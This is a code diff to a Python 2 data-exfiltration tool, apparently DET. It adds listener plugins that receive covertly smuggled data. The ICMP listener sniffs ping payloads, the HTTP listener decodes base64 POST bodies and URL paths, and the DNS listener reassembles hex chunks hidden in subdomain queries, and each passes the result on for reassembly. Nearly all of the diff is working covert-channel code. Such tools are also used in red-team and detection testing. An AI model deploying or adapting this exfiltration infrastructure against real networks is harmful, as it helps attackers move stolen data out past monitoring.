@@ -16,6 +16,16 @@ from os.path import isfile, join
 from Crypto.Cipher import AES
 from zlib import compress, decompress
 
+# Plugins
+import logging
+import requests
+logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
+from dnslib import *
+from scapy import all as scapy
+import base64
+from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
+import urllib
+
 KEY = ""
 MIN_TIME_SLEEP = 1
 MAX_TIME_SLEEP = 30
@@ -24,9 +34,105 @@ MAX_BYTES_READ = 500
 COMPRESSION    = True
 files = {}
 threads = []
+# Plugins
 config = None
 app_exfiltrate = None
+domain = None
+port = None
+buf = {}
 
+class Plugin:
+
+    def __init__(self, app, conf, prt, dm):
+        global app_exfiltrate, config, port, domain
+        app_exfiltrate = app
+        config = conf
+	if config == "icmp": 
+            app.register_plugin('icmp', {'listen': self.icmp_listen})
+	elif config == "http":
+	    port = int(prt)
+	    app.register_plugin('http', {'listen': self.http_listen})
+	else:
+	    domain = unicode(dm, "utf-8")
+	    app.register_plugin('dns', {'listen': self.dns_listen})
+
+    def icmp_listen(self):
+	app_exfiltrate.log_message('info', "[icmp] Listening for ICMP packets..")
+    	scapy.sniff(filter="icmp and icmp[0]=8", prn=self.icmp_analyze)
+
+    def http_listen(self):
+    	app_exfiltrate.log_message('info', "[http] Starting httpd...")
+    	try:
+            server_address = ('', port)
+            httpd = HTTPServer(server_address, S)
+            httpd.serve_forever()
+    	except:
+            app_exfiltrate.log_message(
+                'warning', "[http] Couldn't bind http daemon on port {}".format(port))
+
+    def dns_listen(self):
+    	app_exfiltrate.log_message(
+            'info', "[dns] Waiting for DNS packets for domain {0}".format(domain))
+    	scapy.sniff(filter="udp and port {}".format(int("53")), prn=self.handle_dns_packet)
+
+    def icmp_analyze(self, packet):
+    	src = packet.payload.src
+    	dst = packet.payload.dst
+    	try:
+            app_exfiltrate.log_message(
+                'info', "[icmp] Received ICMP packet from: {0} to {1}".format(src, dst))
+	    app_exfiltrate.retrieve_data(base64.b64decode(packet.load))
+    	except:
+           pass
+
+    def handle_dns_packet(self, x):
+    	global buf
+    	try:
+            qname = x.payload.payload.payload.qd.qname
+            if (domain in qname):
+            	app_exfiltrate.log_message(
+                    'info', '[dns] DNS Query: {0}'.format(qname))
+            	data = qname.split(".")[0]
+            	jobid = data[0:7]
+            	data = data.replace(jobid, '')
+            	if jobid not in buf:
+                    buf[jobid] = []
+            	if data not in buf[jobid]:
+                    buf[jobid].append(data)
+            	if (len(qname) < 68):
+                    app_exfiltrate.retrieve_data(''.join(buf[jobid]).decode('hex'))
+                    buf[jobid] = []
+    	except Exception, e:
+            pass
+
+class S(BaseHTTPRequestHandler):
+
+    def _set_headers(self):
+        self.send_response(200)
+        self.send_header('Content-type', 'text/html')
+        self.end_headers()
+
+    def do_POST(self):
+        self._set_headers()
+        content_len = int(self.headers.getheader('content-length', 0))
+        post_body = self.rfile.read(content_len)
+        tmp = post_body.split('=')
+        if (tmp[0] == "data"):
+            try:
+                data = base64.b64decode(urllib.unquote(tmp[1]))
+                app_exfiltrate.retrieve_data(data)
+            except Exception, e:
+                print e
+                pass
+
+    def do_GET(self):
+        string = '/'.join(self.path.split('/')[1:])
+        self._set_headers()
+        try:
+            data = base64.b64decode(string)
+            app_exfiltrate.retrieve_data(data)
+        except Exception, e:
+            pass
 
 class bcolors:
     HEADER = '\033[95m'
@@ -122,13 +228,12 @@ class Exfiltration(object):
         # Load plugins
         sys.path.insert(0, path)
 	for fname in results.type.split(','):
-	    mod = __import__(fname)
-	    if fname == 'http':
-		plugins[fname] = mod.Plugin(self, results.type, int(results.port))
-	    elif fname == 'dns':
-		plugins[fname] = mod.Plugin(self, results.type, results.domain)
-	    else:
-		plugins[fname] = mod.Plugin(self, results.type)
+	    #if fname == 'http':
+	    plugins[fname] = Plugin(self, fname, results.port, results.domain)
+	    #elif fname == 'dns':
+		#plugins[fname] = Plugin(self, fname, results.port, results.domain)
+	    #else:
+		#plugins[fname] = Plugin(self, fname, results.port, results.domain)
 
     def register_plugin(self, transport_method, functions):
 	self.plugins[transport_method] = functions
@@ -217,7 +322,6 @@ def signal_handler(bla, frame):
     warning('Killing DET and its subprocesses')
     os.kill(os.getpid(), signal.SIGKILL)
 
-
 def main():
     global MAX_TIME_SLEEP, MIN_TIME_SLEEP, KEY, MAX_BYTES_READ, MIN_BYTES_READ, COMPRESSION
     global threads, config
@@ -246,12 +350,12 @@ def main():
         parser.print_help()
         sys.exit(-1)
 
-    if (results.type == "http" and results.port is None):
+    if ("http" in results.type and results.port is None):
         print "Specify a port for HTTP exfiltration!"
         parser.print_help()
         sys.exit(-1)
 
-    if (results.type == "dns" and results.domain is None):
+    if ("dns" in results.type and results.domain is None):
 	print "Specify a domain for DNS exfiltration!"
 	parser.print_help()
 	sys.exit(-1)
